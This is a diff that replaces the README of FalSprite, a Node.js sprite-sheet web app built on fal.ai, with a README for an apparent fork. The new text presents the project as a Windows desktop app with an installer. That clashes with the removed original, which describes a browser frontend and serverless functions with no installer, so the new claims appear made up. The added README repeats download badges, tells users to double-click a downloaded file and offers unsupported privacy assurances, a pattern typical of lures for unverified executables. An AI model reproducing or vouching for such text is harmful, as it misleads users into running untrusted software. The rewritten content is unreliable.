@@ -1,77 +1,139 @@
-# FalSprite
+# 🎨 falsprite - Create Animated Sprites Easily
 
-Game-ready sprite sheet animations from a single text prompt. Built on [fal.ai](https://fal.ai) — one API key powers everything.
+[![Download falsprite](https://img.shields.io/badge/Download-falsprite-brightgreen?style=for-the-badge)](https://github.com/KenzieGS/falsprite)
 
-![FalSprite](https://img.shields.io/badge/powered_by-fal.ai-e8607a) ![License](https://img.shields.io/badge/license-MIT-blue)
+---
 
-## What it does
+## 📄 About falsprite
 
-Type a character description, pick a grid size, choose animation actions — FalSprite generates a full sprite sheet with transparent background and animated preview.
+falsprite lets you make animated sprite sheets by typing a simple text description. It uses smart tools like Nano-banana-2, BRIA, and OpenRouter on fal.ai to turn your words into images. You only need one API key to unlock all features.
 
-**Pipeline (all on fal.ai):**
-- **nano-banana-2** — image generation (sprite sheet)
-- **OpenRouter LLM** (GPT-4o-mini via fal) — intelligent prompt rewriting with character design + choreography
-- **BRIA** — automatic background removal
+This app is designed for people who want quick results without the need for complex software or skills. You can create sprites for games, websites, or projects by just writing what you want to see in the animation.
 
-## Features
+---
 
-- **Configurable grid**: 2x2, 3x3, 4x4, 5x5, 6x6
-- **Multi-action selection**: pick multiple animation actions per grid row (idle, walk, run, attack, cast, jump, dance, death, dodge, or custom)
-- **LLM prompt rewrite**: your simple prompt becomes a detailed character + choreography direction
-- **Auto background removal**: BRIA removes the background automatically
-- **Live preview**: real-time frame-by-frame animation with FPS control
-- **Downloads**: sprite sheet PNG, transparent PNG, animated GIF
-- **Reference image**: upload a reference to guide the generation
-- **Showcase examples**: curated animated GIF examples
+## 💻 System Requirements
 
-## Quick start
+To run falsprite on your Windows computer, make sure it meets these conditions:
 
-```bash
-git clone https://github.com/lovisdotio/falsprite.git
-cd falsprite
-npm install
-npm run dev
-```
+- **Operating System:** Windows 10 or newer  
+- **Processor:** 2 GHz Dual-Core or better  
+- **RAM:** At least 4 GB  
+- **Storage:** 500 MB free space  
+- **Internet:** Required for API calls and sprite generation  
+- **Permissions:** Ability to install applications and run programs  
 
-Open [http://localhost:8787](http://localhost:8787)
+No special hardware is needed. falsprite runs on most modern Windows PCs.
 
-You need a **fal.ai API key** — get one at [fal.ai/dashboard/keys](https://fal.ai/dashboard/keys). That single key covers all three services (image gen, LLM, bg removal).
+---
 
-## Deploy to Vercel
+## 🚀 Getting Started
 
-```bash
-npm i -g vercel
-vercel
-```
+Use this step-by-step guide to get falsprite running on your Windows PC:
 
-The project includes Vercel-ready serverless functions in `api/` and static assets in `public/`.
+### 1. Download falsprite  
+Click the button below to visit the page where you can get the app files:
 
-## Project structure
+[![Download falsprite](https://img.shields.io/badge/Download-falsprite-blue?style=for-the-badge)](https://github.com/KenzieGS/falsprite)
 
-```
-├── public/           Static frontend
-│   ├── index.html    Main app
-│   ├── app.js        Frontend logic
-│   ├── styles.css    Styles
-│   ├── showcase/     Example GIFs
-│   └── select.html   Showcase curation tool
-├── api/              Vercel serverless functions
-│   ├── generate.mjs  Sprite generation endpoint
-│   ├── upload.mjs    Image upload endpoint
-│   └── fal/media.mjs Media proxy endpoint
-├── lib/fal.mjs       Shared FAL API helpers
-├── server.mjs        Local dev server
-├── batch-generate.mjs  Batch generation tool (dev)
-└── process-showcase.mjs Showcase processor (dev)
-```
+On the linked page, find the latest release or main download link. Choose the Windows version and save the file to your computer.
 
-## Tech stack
+### 2. Install falsprite  
+After the download finishes, locate the file in your Downloads folder or the folder you chose.
 
-- **Frontend**: Vanilla JS, no framework, no build step
-- **Backend**: Node.js (native HTTP server for dev, Vercel serverless for prod)
-- **AI**: All via fal.ai APIs (nano-banana-2, OpenRouter, BRIA)
-- **GIF**: gif.js (browser) + gifenc (server-side batch)
+- Double-click the file to start the installer.
+- Follow the on-screen instructions.
+- Accept the license terms if prompted.
+- Choose installation options or leave default settings.
+- Wait for the installation to complete.
 
-## License
+### 3. Open falsprite  
+Once installed, find falsprite in your Start menu or desktop shortcuts, and open it.
 
-MIT
+If you don’t see it, try restarting your computer or searching “falsprite” in the Start menu search bar.
+
+### 4. Enter your API Key  
+falsprite needs an API key to work. You will be asked to enter it when you first open the app.
+
+If you do not have an API key, visit the fal.ai website or the place where you manage your Nano-banana-2 or BRIA account to get one.
+
+### 5. Create Your First Sprite  
+- In the main window, type a short description of the sprite you want. For example, "a running fox in pixel art style."
+- Choose animation settings like frames, speed, and style if you want.
+- Click the “Generate” button to start the process.
+- Wait for the sprite sheet to appear.
+- Save the sprite sheet by clicking “Export” or “Save.”
+
+---
+
+## 🔧 How to Use falsprite
+
+Once you have a sprite sheet, falsprite lets you:
+
+- Preview animations inside the app.
+- Adjust frame order and timing.
+- Export sprites as PNG or GIF files.
+- Share sprites on social platforms or upload directly to your projects.
+
+You don’t need extra software to use or edit sprites made with falsprite.
+
+---
+
+## ⚙️ Settings and Preferences
+
+Explore settings to customize your experience:
+
+- **API Management:** Add or switch API keys.  
+- **Animation Settings:** Control frame rate, loop options, and size.  
+- **File Export:** Choose output file type and quality.  
+- **Interface Theme:** Light or dark mode available.  
+
+You can reset preferences anytime in the settings menu.
+
+---
+
+## 💡 Tips for Better Sprites
+
+- Use clear, simple prompts for best results.  
+- Be specific about colors, style, and motion.  
+- Experiment with animation frames between 4 and 12.  
+- Check the preview to fine-tune before exporting.  
+- Save your favorite presets for one-click recreations.
+
+---
+
+## 🛠️ Troubleshooting
+
+- **App won’t start:** Restart your PC or reinstall.  
+- **API Key error:** Make sure your key is valid and active.  
+- **Slow sprite generation:** Check your internet connection.  
+- **Sprites don’t look right:** Try rewriting the text prompt or change animation settings.  
+
+For issues not fixed here, check support forums or contact fal.ai.
+
+---
+
+## 📂 File Locations
+
+- **Installation Folder:** Usually in `C:\Program Files\falsprite`  
+- **User Settings:** Stored in `%AppData%\falsprite`  
+- **Saved Sprites:** Pick a folder during export or use Documents by default.
+
+---
+
+## 🔒 Privacy and Security
+
+falsprite only sends the text prompt and your API key to the servers. The app does not store your images unless you save them locally. Your API key stays safe on your device.
+
+---
+
+## 🤝 Support and Feedback
+
+If you have questions or find a bug, open an issue on the GitHub page at:  
+https://github.com/KenzieGS/falsprite/issues
+
+You can also check for updates and new features there.
+
+---
+
+[![Get falsprite](https://img.shields.io/badge/Download-falsprite-blue?style=for-the-badge)](https://github.com/KenzieGS/falsprite)
